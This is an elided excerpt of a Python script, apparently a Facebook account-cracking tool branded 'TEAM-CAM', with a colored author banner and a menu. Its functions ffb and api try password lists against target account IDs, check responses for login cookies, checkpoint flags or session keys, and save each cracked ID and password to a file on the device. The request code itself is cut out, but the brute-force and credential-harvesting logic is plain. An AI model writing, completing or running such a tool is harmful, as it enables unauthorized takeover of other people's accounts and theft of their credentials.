...
\33[1;32m───────────────────────────────────────────────────────
\033[1;95m[\033[1;93m[‌>]\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mTEM CAM HACKING 
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mTajul Islam Rabbi
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mHacker25802
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://facebook.com/groups/679095800172232/?ref=share');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TEAM-CAM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [TEAM-CAM] %s | %s'%(ids,pas))
                                open('/sdcard/TEAM-CAM.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [TEAM-CAM] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TEAM-CAM.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [TEAM-CAM] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TEAM-CAM.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/TEAM-CAM.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [TEAM-CAM] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/TEAM-CAM.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [TEAM-CAM] '+uid+' | '+pas+'\033[1;97m')
